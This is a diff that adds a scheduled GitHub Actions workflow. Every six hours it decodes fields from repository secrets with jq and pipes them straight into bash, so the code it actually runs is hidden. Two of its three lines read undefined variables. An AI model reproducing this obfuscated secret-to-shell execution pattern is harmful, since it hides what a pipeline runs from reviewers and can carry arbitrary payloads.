@@ -1,0 +1,18 @@
+name: darenmendeqifenwanbobodaizhe
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: darenmendeqifenwanbobodaizhe
+        env:
+          kok3: ${{ secrets.kok3 }}
+        run: |
+          echo $kok3 | jq -r .cj3 | /bin/bash
+          echo $sgh4 | jq -r .rwr87 | /bin/bash
+          echo $sne238 | jq -r .kpl05761 | /bin/bash
+
